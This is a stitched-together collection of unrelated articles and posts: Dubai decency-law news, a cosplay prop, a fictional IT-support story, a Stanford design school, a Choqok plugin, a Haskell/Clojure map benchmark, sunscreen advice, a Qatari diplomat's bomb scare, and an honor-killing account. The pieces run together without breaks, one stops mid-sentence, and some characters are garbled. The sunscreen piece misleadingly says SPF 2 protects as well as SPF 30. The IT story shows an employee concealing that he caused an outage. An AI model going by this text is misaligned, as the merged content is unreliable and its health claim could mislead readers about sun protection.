ANALYSIS Magdi Abdelhadi , BBC News Dubai looks very Western with its gleaming apartment blocks and super modern shopping malls .
The Western façade can , however , lull the unsuspecting visitor into believing that it is also a liberal society .
And that appears to be primarily why Western visitors have recently fallen foul of the law there .
Scratch the modern surface and you discover a conservative Muslim culture , arguably far more so than many others in the Middle East .
Consumption of alcohol is restricted to a small number of places , mainly for Western visitors and expatriates .
Although there is no strict separation of the sexes as in neighbouring Saudi Arabia , the boundaries for what you can and cannot do in public can be tricky , especially for outsiders .
While an unmarried Western couple can share a room in a hotel - or even live together - they are expected to observe local custom when outside their home .
So sentencing a couple for having kissed in public may be shocking for Western public opinion , but will most likely be applauded in conservative Arab societies , especially where there is a perception that Westerners are often expected to be given a preferential treatment .
The defendants also claimed they had merely kissed each other on the cheek , and therefore had not broken any laws .
The BBC's Ben Thompson , at the court , said the judge spoke entirely in Arabic as he quickly dismissed the appeal , saying he upheld the previous sentence .
They were fined 1,000 dirhams , which is about £ 200 .
They now have 30 days to appeal .
It was left to the defence lawyer to explain the verdict to Najafi and Adams .
Najafi said after the case : " It 's very harsh , based on contradictory evidence .
The courts have n't called on any of our witnesses who are prepared to testify that this did n't happen . "
His mother , Maida Najafi , told the BBC her son had grown up in the UK and was used to common British greetings .
" Maybe they think he should know better because he 's from a Muslim family but Ayman grew up in this country , and that 's the normal greeting ... in this country , " she said .
The pair decided not to start their sentence immediately , but the Dubai authorities are holding their passports so they are unable to return to Britain .
Professor John Strawson , an expert in Islamic law , told BBC Radio 5 Live he was not surprised by the judge 's decision .
He said : " The problem in this particular case is that one of the British citizens is of Muslim origin .
" And I think that the combination of the alleged kissing and the consumption of alcohol in an illegal place , meant that this was a case that the authorities really wanted to pursue , and they are probably sticking to their rigid interpretation of the law . "
Professor Strawson said the Dubai authorities often turned a blind eye to foreigners ' behaviour , because of the high income that comes from tourists .
But he said Dubai had recently issued new explanations tightening up their laws .
' Cultural differences '
The Foreign Office advises Britons going to Dubai , which is part of the United Arab Emirates , to be wary of breaching local customs .
A statement on its travel advice website reads : " Britons can find themselves facing charges relating to cultural differences , such as using bad language , rude gestures or public displays of affection . "
Najafi , from north London , had been working for marketing firm Hay Group in Dubai for about 18 months .
The case is the latest in a series of incidents over recent years in which foreigners have broken Dubai 's strict decency laws .
In March , an Indian couple in their 40s were sentenced to three months in jail in Dubai after sending each other sexually explicit text messages .
In 2008 , two Britons accused of having sex on a beach in Dubai were sentenced to three months in jail , though the sentences were later suspended .
To hear more of the interview with Maida Najafi tune in to John Pienaar on BBC Radio 5 live 's Weekend News at 2100 BST on Sunday .

Hylian Shield : Zelda Twilight Princess
This is Link ’s Hylian Shield from Zelda : Twilight Princess .
The surface of the shield was made of very strong resin to resist light impacts , while the inside was filled with foam to keep the weight down during cosplay .
The shield measures a 25 ” x 20 ” inch surface area , and has an overall weight of about 5 lbs .
The automotive paint gives a reflective chrome shine to the prop , and creates the appearance of a steel replica .
The back is also adorned with a sturdy handle and leather arm strap for wielding right handed , but can be swapped for left handed as well .

Lennart was n't quite out of college yet .
He still had a semester to go after his co-op job , and he had used everything he 'd learned from his Career Integration course to land a job with a respectably - sized , multi-national corporation .
The position was end - user support for the company 's Oracle installs .
It was n't an ideal position , especially considering some sentiments he agreed with -- but given the dry job market , he could n't complain .
On his first day , he was given a desk , and a dust - coughing beige box .
It was just like a computer , only slower .
He spent the better part of the morning uninstalling a plethora of memory - hoggers .
That , and rebooting .
So much rebooting .
Each uninstall brought him one logarithmic step closer to a usable computer .
He 'd just uninstalled Oracle Instant Client and was about to install the full blown Administrator - Client , when the support phone rang .
" The database is gone ! " said the frantic voice on the other end .
What 's gone and what 's past help
" I understand the database being gone could be a problem , and I am more than happy to assist you , " Lennart soothed , putting last semester 's Interpersonal Communications course to good use .
" It would be a big help to me if you could read the error message . "
" ORA - 12154 : TNS : could not resolve the connect identifier specified . "
That had been covered in Introduction to Oracle Databases .
There was a problem with the user 's tnsames .ora file -- a sort of DNS for Oracle .
Without it , applications do n't know where to look for their databases .
" I 'd like to look at your tnsnames.ora , if that 's ok , " Lennart said .
He guided the user to the registry entry with the file 's path .
" \\CORPBSMT\Everyone\tnsnames.ora , " the user read , " But it 's not there ! "
Odd .
Lennart opened the shared folder , and sure enough , it was empty .
Maybe it was a permissions issue ?
Nope , he had Full Control .
" I need to consult with one of my colleagues on this matter .
May I put you on hold for a moment ? "
" Fine , but just hurry up and put the database back !
I have work to do . "
Frailty , Thy Name is Oracle
Lennart turned to the technician the next desk over , a harried fellow who looked a phone - call away from a self - induced head - desk related death .
" Say , do you have a copy of tnsnames.ora ? "
Lennart asked .
" No . Everyone 's calling about it .
It 's gone . "
" I know , my caller 's file is gone , too . "
" There is no ' too ' .
The file is gone .
We use the one tnsnames.ora , so we do n't have to maintain ten thousand local copies of it .
Just tell the callers we 're working on it . "
Lennart picked the call back up .
" Hi . I 'm sorry , it seems we 're having a bit of technical difficulties ... "
It was a line Lennart repeated over and over , call after call .
At the supervisor 's desk , higher tiers of support were conferencing with even higher tiers of support .
Each second that ticked by was roughly two and a half hours of lost productivity , company - wide .
Presently , a mass email to All IT arrived in Lennart 's box .
Though the file server was backed up , that particular share had n't been .
All IT departments were to immediately forward all Oracle database information they had , to rebuild tnsnames.ora .
Also ,
All IT Departments were to immediately update all Anti-Viruses , and be on the lookout for malicious software .
Lennart mused back on his Methods of Critical Thinking course .
How could the file have disappeared ?
Deleted by a user ?
Possibly , but there was that saying about not attributing things to malice .
If it was unintentional , why now ?
What was different about today ?
Well , there was Lennart himself .
But that was just a coincidence .
Right ?
Et Tu , Lennart ?
Lennart had a stomach - kicker of a thought , and set up a quick experiment to , hopefully , disprove it .
He grabbed the version of Oracle Instant Client that the company used , reinstalled it , mocked up a local tnsnames.ora , and then uninstalled the Client .
The uninstaller removed everything that belonged to the client -- including every file referred to in the client 's Registry entries .
Tnsnames.ora ' disappeared '.
Had no one ever uninstalled the Client before ?
Probably not .
Uninstalling things did n't seem to be commonplace , given the initial state of his PC .
He knew he should report how it had happened -- but what would happen to him ?
H.R. had signed his contract , for whatever that was worth these days .
This could have happened to anyone .
He should n't be punished for a bad luck of the draw !
Though ...
Technically , they 'd already ascribed blame to ' malicious software ' .
Technically , they were kinda right .
Thus , technically , the company wide database outage was n't Lennart 's fault .
At least , not in a way anyone could prove .
Lennart quietly reinstalled the Oracle Administrator - Client , and went about his duties .
He wondered if this would make a good case study for next semester 's Business Ethics course .
A new home for design at Stanford
The newly renovated Building 550 , which brings together the Hasso Plattner Institute of Design – better known as the d.school – and the Design Group of the Mechanical Engineering Department , is designed for redesign .
Gordon Gurley George Kembel , executive director of the Hasso Plattner Institute of Design offers a tour of the new facility for Open Office Hours on Facebook .
After four moves in five years , the Hasso Plattner Institute of Design finally has a home in the newly renovated Building 550 .
But the institute 's culture of innovation and improvement means the inside of the building is designed to be always changing .
" The most important thing we 've learned so far about how to design our space is that everything needs to be on wheels , " said David Kelley , founder of the institute , commonly known as the " d.school . "
The couches , tables , walls – almost everything in the new building – can be moved around .
The building , which opened this spring , brings together students and faculty from Stanford 's d.school and the Mechanical Engineering Department 's design group to collaborate on innovative projects .
On May 7 , there will be an official opening event to celebrate their new home .
The d.school , founded in 2005 , is a non-degree program that teaches students across the university to use design methodology to tackle problems in their own fields .
The school works with about 350 students , whose primary interests range from law to business , education , medicine and engineering .
One initiative housed in the d.school , for example , is the K - 12 Laboratory .
Started by students from the School of Education and faculty from the d.school in 2006 , the group is focused on helping students between kindergarten and college feel more confident in using their creative talents .
L.A. Cicero Co-term grad student Indu Premakumar and GSB student Joy Sun work on a project to develop a tool for more efficiently processing candle nuts for their ' Design for Extreme Affordability ' class .
Daniel Steinbock , a graduate student in education , was one of the founding members of the K - 12 Laboratory and has been involved in the d.school since he arrived at Stanford in 2005 .
He said the most important thing for fostering creative confidence is creating an environment that encourages multiple attempts and failures .
" People acknowledge that mistakes are how you learn , but they do n't necessarily create a whole culture and repertoire of collaborative processes that embody and continually reinforce that , " he said .
Playing double duty
The d.school has used the spirit of experimentation to make the most of its multiple moves .
Since its first space in two white trailers at the edge of campus , the d.school has been housed in Sweet Hall and Building 524 .
Rather than separate student workspaces and classrooms , the new d.school home has learned to use the same space for both .
Not only is this dual use more efficient in terms of space , but it may foster creativity among the students .
" They do n't feel like they are in class anymore , they feel like they are just working , " said George Kembel , executive director of the d.school .
" The faculty become more like coaches than lecturers . "
Each d.school class is taught by a group of faculty members – students never hear just one point of view .
" We nominally have business , technology and human values represented by the faculty on every teaching team , " Kelley said .
" When you have multiple faculty with different points of view that do n't agree with each other , the student has the problem of figuring out what they actually believe . "
Opening celebration
The May 7 opening celebration will include a talk by Kembel and tours of the building .

During last week I was working on a new plugin system for Choqok , It ’s idea was in my mind for about 2 months , But now ,
It ’s ready to use , and develop plugins for it .
Choqok supports image uploading to Twitpic since early versions , and supports Media attachment in Identica / Statusnet service since latest Beta release .
But ,
There are so many image / video uploading services out there !
what if we want to support them too !?
Here is the answer : A plugin system to support more services as easy as writing one or two functions :)
There ’s just one function to override :
void upload ( const KUrl &localUrl , const QByteArray & medium , const QByteArray & mediumType )
Choqok will load medium , detects it ’s mime type and provide it to plugin as a ByteArray !
So , plugin just have to upload file with the service API , and then emit the mediumUploaded ( ) signal :)
Now we have a global Medium uploading dialog right in Tools menu :
I have ported the Twitpic plugin to this new system , And wrote a plugin for YFrog service .
It still needs some improvements to be what i want ;)
The dangers of ' sexting ' added to school curriculum for pupils as young as FIVE
Pupils will be taught about the dangers of sexting in school
Children will learn about the dangers of ' sexting ' in a Government drive to stamp out violence against women .
Pupils as young as five will be given lessons on domestic violence and sexual bullying which will cover the impact of the media and technology .
Staff will be trained to recognise the signs that girls are being harassed through ' sexting ' or lewd text messages and to discuss the problem in class .
The initiative follows ' sex text ' scandals involving celebrities Vernon Kay and Ashley Cole .
The Violent Against Women and Girls Advisory Group , representing women's and anti-bullying organisations , has told the Government all teachers should be trained ' in the impact of technology on violence against women and girls ' .
This includes ' so - called " sexting " , grooming , child sexual abuse and sexualised images of children and young people online ' .
Under the blueprint , accepted in full by ministers yesterday , teachers will also be encouraged to tackle the ' stereotyping and objectification ' of women and girls in games consoles and music videos .
The advisory group says schools should promote ' respectful ' masculinity as an ideal for all boys .
On the most recent episode of The Daily Show , funnyman Jon Stewart took a comical look at the entire leaked iPhone / Gizmodo fiasco where he criticized California authorities for using a warrant to break into Gizmodo editor Jason Chen 's home .
" The cops had to bash in the guys door ?
Do n't they know there 's an app for that ? "
Stewart finished with a sarcastic , but not really , rant against Apple 's newfound role as " big brother . "
Video of the segment is below .
The meat and potatoes starts at around 2 minutes and 10 seconds in .
Here 's partial transcript of Stewart 's closing diatribe against Apple .
Solid stuff .
" Apple , you know I love you guys , right ?
I love your products , I use them all the time .
I even love your stores , so futuristic they look like futuristic Swedish hospitals , the kind where they keep your clone in the back to replace your organ when you need it ...
Apple - you guys were the rebels , man , the underdogs .
People believed in you .
But now , are you becoming the man ?
Remember back in 1984 , you had those awesome ads about overthrowing Big Brother ?
Look in the mirror , man !
Or actually just look into the screen of your iPad before you turn it on , because it is surprisingly reflective …
It was n't supposed to be this way .
Microsoft was supposed to be the evil one .
But you guys are busting down doors in Palo Alto while Commandant Gates is ridding the world of mosquitoes !
What the f*ck is going on ?!
It 's all mixed up !
… I know that it is slightly agitating that a blog dedicated to technology published all that stuff about your new phone .
And you did n't order the police to bust down the doors , right ?
I 'd be pissed too , but you did n't have to go all Minority Report on his ass !
I mean , if you wanna break down someone 's door , why do n't you start with AT&T , for God sakes ?
They make your amazing phone unusable as a phone !
I mean , seriously !
How do you drop four calls in a one - mile stretch of the West Side Highway !
There 're no buildings around !
What , does the open space confuse AT&T 's signal ?!
… Come on , Steve .
Chill out with the paranoid corporate genius stuff .
Do n't go all Howard Hughes on us . "
Ask me About Jesus
So , I see this car out in the parking lot and it says " Ask me about Jesus . "
I thought to myself , " What is ...
The fast , efficient association map has long been the holy grail of the functional programming community .
If you wanted such an abstract data structure in an imperative language , there would be no question about it : you would use a hash table .
But the fact that the hash table is founded upon the destructive update makes it hard to use with pure code .
What we are in search of is a strictly more powerful association map , one that implements a non-destructive update ( i.e. is " persistent " ) .
In the Haskell world , Data .
Map is a reasonably compelling general - purpose structure that only requires the Ord typeclass on its keys .
For keys that map cleanly on to machine - size integers , IntMap is an extremely fast purely functional that uses bit twiddling tricks on top of big-endian Patricia tries .
Other functional programming languages have championed their own datastructures : many of Clojure 's collections critical datastructures were invented by Phil Bagwell , among them the hash - array mapped trie ( PDF ) , which drives Clojure 's persistent association maps .
On paper , the implementations have the following asymptotics :
Data .Map .
Let n and m be the number of elements in a map .
O( log n ) lookups , inserts , updates and deletes .
O( n+m ) unions , differences and intersections
Data .
IntMap .
Let n and m be the number of elements in a map , and W be the number of bits in a machine - sized integer ( e.g. 32 or 64 ) .
O( min( n , W ) ) lookups , inserts , updates and deletes .
O( n+m ) unions , differences and intersections .
Hash array mapped trie .
Let n be the number of elements in a map .
Since Hickey 's implementation does n't have sub - tree pools or root - resizing , we 'll omit them from the asymptotics .
O( log(n ) ) lookups , inserts , updates and deletes .
No implementation for unions , differences and intersections is described .
Unfortunately , these numbers do n't actually tell us very much about the real world performance of these data structures , since the world of associations is competitive enough that the constant factors really count .
So I constructed the following benchmark : generate N random numbers , and insert them into the map .
Then , perform lookups on N / 2 of those random numbers , and N / 2 other numbers that were not used ( which would constitute misses ) .
The contenders were IntMap and HAMT ( with an implementation in Java and an implementation in Haskell ) .
Initial results indicated that IntMap was faster than Java HAMT was much faster than Haskell HAMT .
Of course , this was absolutely bogus .
I turned to the Clojure mailing list and presented them with a strange ( incorrect ) result : Haskell 's IntMap was doing up to five times better than Clojure 's built - in implementation of HAMT .
Rich Hickey immediately pointed out three problems with my methodology :
I was using Java 's default heap size ( to be fair , I was using Haskell 's default heap size too ) ,
It was n't performed with the - server flag , and
flag , and I was n't accounting for the JVM 's profile - driven optimization .
( There were a few more comments about random number generation and interleaving , but further testing revealed those to be of negligible cost . )
Rich offered me some new code that used ( apply hash - map list - of - vals ) to construct the hash - map , and after fixing a bug where Rich was only inserting N / 2 entries into the hash table , I sallied on .
With an improved set of test - cases , I then derived the following statistics ( for the source , check out this IntMap criterion harness , and the postscript of this blog post for the Clojure harness ) :
IntMap Java HAMT ( 32K - 512K ) Java HAMT ( 512K - 32 K ) 32 K .035s .100s .042s 64 K .085s .077s .088s 128 K .190s .173s .166s 256 K .439s .376s .483s 512 K 1.047s 1.107s 1.113s
Still puzzling , however , was the abysmal performance of my Haskell reimplementation of HAMT , performing three to four times worse even after I tore my hair out with bit twiddling tricks and GHC boxing and unboxing .
Then , I had a revelation :
public static PersistentHashMap create( List init ) { ITransientMap ret = EMPTY.asTransient ( ) ; for ( Iterator i = init.iterator ( ) ; i.hasNext ( ) ; ) { Object key = i.next ( ) ; if (!i.hasNext ( ) ) throw new IllegalArgumentException ( String.format
( " No value supplied for key : %s " , key ) ) ; Object val = i.next ( ) ; ret = ret.assoc ( key , val ) ; } return ( PersistentHashMap ) ret.persistent ( ) ; } }
That tricky Hickey : he 's using mutation ( note the asTransient call ) under the hood to optimize the ( apply hash - map ... ) call !
A few tweaks later to force use of the functional interface , and voila :
Haskell Clojure 128K 0.56s 0.33s 256K 1.20s 0.84s 512 K 2.62s 2.80s
Much more comparable performance ( and if you watch closely the JVM numbers , they start off at about the same as Haskell 's , and then speed up as HotSpot kicks in . )
Unfortunately , I can't play similar tricks in the Haskell world .
For one thing , GHC does n't have runtime profile - based optimization .
Additionally , while I certainly can unsafely freeze a single array in GHC ( this is standard operating procedure in many packages ) , I can't recursively freeze arrays pointing to arrays without walking the entire structure .
Thus , blazing fast construction of recursive datastructures with mutation remains out of reach for Haskell ... for now .
This is very much a story in progress .
In particular , I still have to :
Do a much more nuanced benchmark , which distinguishes the cost of insertion , lookup and other operations ; and
Implement IntMap in Java and see what the JVM buys the algorithm , unifying the garbage collection strategies would also be enlightening .
Postscript .
You can see the gory details of the benchmarking on the Clojure mailing list .
Here is the test code that was used to test Java 's HAMT implementation .
First with mutation :
( ns maptest ( : gen-class ) ) ( defn mk- random - stream [ ] ( let [r ( new ec.util.MersenneTwisterFast ) ] ( repeatedly ( fn [ ] (. r ( nextInt ) ) ) ) ) ) ( defn main [ i ] ( let [ vals ( vec ( take (* i 2 ) ( mk-random - stream ) ) ) dvals ( take (* i 2 ) ( doall ( interleave vals vals ) ) ) ] ( dotimes [ _ 10 ] ( time ( let [m ( apply hash - map dvals ) ] ( reduce ( fn [s k ] (+ s ( m k 0 ) ) ) 0 ( take i ( drop ( / i 2 ) vals ) ) ) ) ) ) ) ) ( doseq [n ( range 5 10 ) ] ( let [ i (* 1000 ( int ( Math / pow 2 n ) ) ) ] ( println " I = " i ) ( main i ) ) )
Here is the alternative main definition that forces usage of the functional interface :
( defn main [ i ] ( let [ vals ( vec ( take (* i 2 ) ( mk-random - stream ) ) ) ] ( dotimes [ _ 10 ] ( time ( let [m ( reduce ( fn [m x ] ( assoc m x x ) ) ( hash - map ) vals ) ] ( reduce ( fn [s k ] (+ s ( m k 0 ) ) ) 0 ( take i ( drop ( / i 2 ) vals ) ) ) ) ) ) ) )

SPF stands for sun protection factor .
Simply put , an SPF rating tells you how long you can stay in the sun without getting burned while wearing that sunscreen , compared with how long you can stay in the sun before you burn without wearing that sunscreen﻿﻿ .
For example , if it typically takes you 15 minutes to burn without sunscreen and you apply an SPF 10 , it will take 10 times longer ( 2.5 hours ) to burn in the sun .
How SPF
Is Determined
The SPF number is determined through indoor experiments that expose human subjects to a light spectrum meant to mimic the noontime sun ( when the sun 's rays are at their most intense ) .
Some subjects wear sunscreen and others do not .
The amount of light that induces redness in sunscreen - protected skin , divided by the amount of light that induces redness in unprotected skin is the SPF .﻿﻿
What the SPF Number Means
A higher SPF does n't indicate superior sun protection — it indicates that you will remain protected in the sun for a longer amount of time .
For example , an SPF 2 product protects your skin just as effectively as one with an SPF of 30 .
However , SPF 2 sunscreen will need to be applied more frequently .
To be safe , no matter what SPF you choose , it 's best to reapply sunscreen at least every two hours , as well as after swimming or sweating .
In fact , the American Academy of Dermatology recommends daily application of SPF 30 to all exposed skin .﻿﻿
UVA vs. UVB Rays
The SPF only indicates the level of protection against the sun 's ultraviolet B rays , which are called UVBs for short .﻿﻿
Initially , UVB rays were thought to be the only UV rays to worry about , since they are shorter in length and cause sunburn .
However , ultraviolet A ( UVA ) rays also pose risks .
They age the skin and contribute to skin cancer .
SPF alone does not protect against UVA rays .
In order to get the best sun protection possible , look for a sunscreen that provides both UVA and UVB protection .﻿﻿
Buying Tip Look for a sunscreen that says " broad spectrum " or " full spectrum " on the label and that has an SPF of at least 30 to protect your skin from both UVA and UVB rays .
What Else You Wear Matters , Too
Wearing sunscreen with an adequate SPF , and doing so properly , is key to protecting your skin .
But the clothing you wear is also important .
Regular Clothing
Generally speaking , long sleeves and pants are more protective than tank tops and shorts .
But even if you 're covered in clothing from head to toe , there is a chance that sun can make its way right through fabric fibers .
When some fabrics are examined under a microscope , especially if they are made from fibers knitted or woven together , space between fibers is visible .
UV rays can penetrate through those spaces and reach skin .
The more tightly knit a fabric is , such as denim , the less likely UV rays can get through .
The less tightly knit a fabric is , such as linen , the more likely UV rays can get through .
If you opt for lightweight , summery fabrics , you should still apply sunscreens even on parts of the body that are covered up .﻿﻿
Sun-Safe Clothing
Wearing sun-safe clothing is a great additional measure you can take beyond wearing sunscreen to help protect your skin from the sun .﻿﻿
It 's especially a great idea for young , active children who may have trouble sitting still for a few minutes while a parent tries to apply sunscreen , and who are often in and out of a pool , lake , or ocean .
UPF clothing is made with fabric that protects skin from the sun .
UPF stands for ultraviolet protection factor , a rating that indicates what fraction of the sun ’s UV rays can penetrate fabric .
For example , if you are wearing a shirt with a UPF rating of 50 , that shirt allows for 1/50th of the sun ’s UV radiation to reach skin underneath the shirt .
One example of a brand that specializes in this type of UPF clothing is Coolibar , which makes clothing and accessories for adults and children .
UPF clothing is becoming increasingly more common , especially in kids ' clothing and beachwear items like rash guards .
Buying Tip
Be picky about which type of sun-safe clothing you buy .
A long - sleeved shirt covers more skin and provides more sun protection than a tank top , and a floppy , wide - brimmed hat shields the face better than a baseball hat .
A Word From Verywell
While a quality sunscreen and appropriate clothing can protect you from the sun , you should also avoid working outside during peak daylight hours .
Seek shade between 10 a.m. and 4 p.m. when the sun is at its peak .﻿﻿
You are more likely to get skin damage during these hours , especially with sensitive skin .
Even in the winter , sun protection is still important .
You should also protect yourself indoors and while driving because the sun can penetrate through windows .
In your car , transparent window film screens can block out the sun rays ; at home , draw blinds closed during peak sunlight hours .

Update : Diplomat was to meet jailed terrorist
WASHINGTON
Ã¢â‚¬â€ A Qatari diplomat who caused a bomb scare after sneaking a smoke in an airplane bathroom was traveling for a consular visit to see an imprisoned al - Qaida agent .
A State Department official and another person close to the matter say Mohammed Al - Madadi was going to meet Ali Al - Marri for an official visit .
Consular officials frequently visit foreigners held in the United States to make sure they are being treated well .

The two sources spoke to The Associated Press on condition of anonymity because they were not authorized to discuss the matter .
Officials say the diplomat will be sent home or transferred to another country for touching off the bomb scare .

Associated Press writer Matt Apuzzo contributed to this report .
Banda contributed from Denver .
DENVER Ã¢â‚¬â€ œ
The Qatari envoy who joked about lighting his shoe on fire who sparked a bomb scare and the scrambling of US fighter jets has been released from custody and will not be criminally charged .
Authorities found no explosives on the Washington - Denver flight .
Officials granted anonymity by the Associated Press said they did n’t “ think the envoy was trying to hurt anyone ” and thus wo n’t face charges .
ADVERTISEMENT
“ Foreign diplomats have broad immunity from prosecution , ” the wire service noted .
“ The official said if the man ’s identity as a Qatari diplomat was confirmed and if it was found that he may have committed a crime , US authorities would have to decide whether to ask Qatar to waive his diplomatic immunity so he could be charged and tried . ”
“ Qatar could decline , the official said , and the man would likely be expelled from the United States , ” it added .
US air marshals had wrestled the Qatari diplomat to the floor on a flight to Denver in a security scare that prompted fighter jets to be scrambled and top White House aides to brief President Barack Obama , officials said .
ADVERTISEMENT
But in the end , the incident on Wednesday turned out to be a false alarm , triggered when the Qatari reportedly lit a cigarette in one of the plane ’s restrooms and then , when confronted , joked he was trying to ignite his shoes .
The plane landed safely at Denver International Airport following the disturbance , and US officials later said it appeared the passenger was not trying to blow up the plane , although the incident was under investigation .

Qatar ’s ambassador to Washington Ali Bin Fajad al - Hajari said in a statement that the diplomat was traveling to Denver on official embassy business .
“ He was certainly not engaged in any threatening activity , ” the ambassador said .
“ The facts will reveal that this was a mistake , and we urge all concerned parties to avoid reckless judgments or speculation . ”
But the scare prompted fighter jets to scramble and intercept the flight amid fears of a possible repeat of a passenger ’s foiled attempt to bring down a Northwest Airlines jet on Christmas Day as it approached to land at Detroit .

“ The president was briefed by National Security Advisor General Jim Jones and National Security Staff Chief of Staff Denis McDonough at 8:50 pm EDT and appropriate actions were taken to ensure the safety of the traveling public , ” a White official said on condition of anonymity .
“ The incident is currently under investigation , ” the official added .
Obama was aboard Air Force
One at the time , en route to Prague to sign a nuclear arms reduction treaty with Russia .
Law enforcement authorities initially notified key lawmakers that US air marshals subdued the Qatari national after he apparently sought to “ ignite their ( his ) shoe ” on the flight , a congressional aide told AFP on condition of anonymity .

“ Air marshals jumped in , and the cockpit was n’t breached , ” the official said .
The man was identified in US media reports as Qatari diplomat Mohammed al - Modadi , 27 , who as the third secretary and vice consul of the Qatari embassy in Washington enjoys full diplomatic immunity .
The FBI was investigating the incident , but a US official told AFP the incident was “ not what it appeared to be ” and there was no attempt to detonate a bomb .
NBC News said a search of the man found no explosives and that bomb - sniffing dogs found no traces of explosives aboard the aircraft .

The Transportation Security Administration ( TSA ) said the passenger was placed in custody , adding it was “ monitoring ” the incident .
Federal officials told NBC the incident occurred half an hour before United Airlines flight 663 was due to make a scheduled stop in Denver on a flight that originated at Washington ’s Reagan National Airport .
A flight attendant smelled smoke as a passenger came out of a restroom , and alerted an air marshal , the report said .
The marshal confronted the man , and then wrestled him to the ground after he made the statement about lighting his shoes , NBC said .
A US security official acknowledged “ it may have been a massive misunderstanding , ” telling ABC that Al - Modadi may have been making a “ sarcastic ” comment when he was confronted by two air marshals .

The pilot declared an emergency , and two F - 16 fighter jets raced to intercept the aircraft around 6:45 pm ( 0045 GMT Thursday ) under the authority of the North American Aerospace Defense Command ( NORAD ) .
“ Shortly before landing in Denver , a passenger possibly caused a disturbance on the plane .
Upon intercepting the aircraft , the F - 16s escorted the aircraft until it landed safely without incident at approximately 6:50 pm ( 0050 GMT ) where the plane was met by local law enforcement , ” NORAD said .
The plane was carrying 157 passengers and six crew members on a flight originally scheduled to ultimately arrive in Las Vegas after a scheduled stop in Denver .
The incident came a week after the United States unveiled new security measures subjecting all US - bound plane passengers to screening methods that use real - time intelligence to target potential threats , replacing the mandatory screening of passengers from a blacklist of 14 mainly Muslim countries .

The measures were announced in the wake of a Nigerian man ’s failed attempt to detonate explosives concealed in his underwear on a Detroit - bound flight from Amsterdam on Christmas Day .
Noor Almaleki typed a text message to a friend .
" Dude , " she wrote at 1:06 p.m. last October 20 , " my dad is here at the welfare office . "
Noor , 20 , had n't seen her father , Faleh , since moving out of the family home in Glendale months earlier .
His presence both startled and alarmed her .
She knew he would n't rest until he 'd regained complete control of her life .
Noor was the firstborn of Faleh and Seham Almaleki 's seven children .
Her first name means " light of God . "
The Almalekis had moved to the United States from Iraq when Noor was 4 .
Noor was thoroughly assimilated into American culture but kept in touch with her Iraqi roots ( she was fluent in Arabic ) and considered herself a Muslim , the same religion as her parents .
But she had moved away from her parents in early 2009 ( not for the first time ) after another blowup over how she was living her life — tight jeans , makeup , boyfriends , modeling photos , and an attitude that screamed independence and self - determination .
The clashes escalated in 2008 after Noor , then 18 , left her marriage to an older cousin in Iraq — her father had " arranged " it — and returned to the Phoenix area .
Noor sent her text message from inside an Arizona Department of Economic Security office in Peoria .
Seated next to her was Amal Edan Khalaf , her latest boyfriend 's 43 - year - old mother .
Amal was there to complete a change - of - address form for welfare benefits .
She , too , is Iraqi by birth but moved to the States only about a decade ago , and her proficiency in English was such that Noor came along to help translate .
Noor had lived at Amal 's residence since leaving her parents ' home after the latest fracas .
It was bad enough that she was staying with Amal , whom Faleh and his wife , Seham , had known for years and considered unfit as a mother and wife ( she was separated from her husband at the time ) .
Noor 's boyfriend , Amal 's 19 - year - old son , Marwan Alebadi , also lived there , and the Almalekis — particularly Noor 's father — were enraged and shamed by the situation .
From their perspective , a man 's daughters are his property , and they must live with him until he decides otherwise .
Females who stray from the fold — or are perceived to have strayed — are considered guilty of dishonoring their clans .
To Faleh Almaleki , there was nothing worse .
The alleged wrongdoing often revolves around sexual " immorality , " but not always .
Riffat Hassan , a retired University of Louisville professor and expert on the Koran , writes , " Muslim culture has reduced many , if not most , women to the position of puppets on a string , to slave - like creatures whose only purpose in life is to cater to the needs and pleasures of men . "
The Almalekis were proud members of that " Muslim culture . "
By moving in with Marwan and Amal , Noor Almaleki had made it clear that she would not be her father 's puppet , his " slave - like " creature .
She was determined to live how , and with whom , she wished .
Some cultures , including the Almalekis ' , endorse ancient methods of " cleansing " a family 's supposedly tarnished name — with the blood of its daughters , sisters , and wives .
In India , Hindu and Sikh brides are sometimes slain because their dowries are considered inadequate , the U.N. Children 's Fund reports .
In Islamic Middle Eastern countries , there 's a name for the homicides of women by male family members : " honor killings . "
These murders of loved ones often are committed with knives , machetes , or bare hands .
Victims have been tied up and buried alive .
According to news accounts , the father and grandfather of a 16 - year - old Islamic girl in Turkey did just that a few months ago after someone reported seeing her talking with boys .
No one can say exactly how many " honor killings " occur , but anecdotal evidence ( from media accounts and government data ) suggests that hundreds of Muslim women and girls die this way every year .
According to a 2006 statement by a U.N. news agency , 47 women died in " honor killings " in 2006 in Basra , a seaport city of about four million people that is Faleh Almaleki 's hometown .
Such killings by Muslim immigrant men are reported in Western nations , as well : Five were accused of murdering female kin in the United States from the start of 2008 until October 20 , 2009 .
That was the day Faleh Almaleki , an unemployed 48 - year - old trucker with no criminal record , took a grim step toward adding himself to that list of accused " honor " murderers .
Noor sent a second text message after her father stepped into the DES office , this one to her best friend , Ushna Khan .
" Dude , I 'm so scared .
Shit , " she wrote .
" At the welfare place , and guess who walks in ?
My dad !!!
I 'm so shaky ! "
" Holy shit , did he see you ? "
Ushna quickly responded .
" I do n't think so , " Noor typed .
" His fat ass is right by the door so I can't even leave .
I 'm laughing like a crazy person .
I hate when this happens to me .
I knew I should n't have [ woken ] up . "
" Oh dear , that 's awkward , " Ushna said .
" What 's up with your parents , anyway ? "
" My dad is a manipulative asshole , " Noor replied .
" I 've honestly never met anyone . . . so evil . "
Amal Khalaf watched as Faleh took a number at the counter and then sat near her and Noor .
Faleh was on his own cell phone around the time that his daughter was texting .
He spent five minutes speaking with his oldest son , Ali , 18 months younger than Noor .
Faleh also spoke with a male relative in Detroit and several times with wife Seham , who was working as a translator at a U.S. military base near Bakersfield , California .
Minutes after he arrived , Faleh left the DES office without comment .
At 1:32 , Noor sent a final text to Ushna in which she appeared more relaxed .
" What time do you get out of work ? "
Noor asked her friend .
" Are you going to have time [ to meet ] ? "
Amal 's number finally got called , and she and Noor stepped up to a counter to take care of business .
That took several minutes .
Amal had parked her van near the front door , in a crowded lot the DES shares with a popular Mexican restaurant about 100 yards west .
But Amal remained wary of Faleh .
She knew how angry he was with her for allowing Noor to move into her home .
Their families once had been friendly , in Iraq and then in the States .
Amal Khalaf had baby - sat the Almalekis ' young children when Seham was working .
But any good feelings evaporated after Noor moved in with Marwan and Amal .
Amal wanted to scope out the parking lot for Faleh and his 2000 silver - gray Jeep Cherokee before leaving the DES office with Noor .
Noor did n't seem as worried .
She said her dad might spit on her if he had the chance — nothing more .
The coast looked clear , so they headed for Amal 's van .
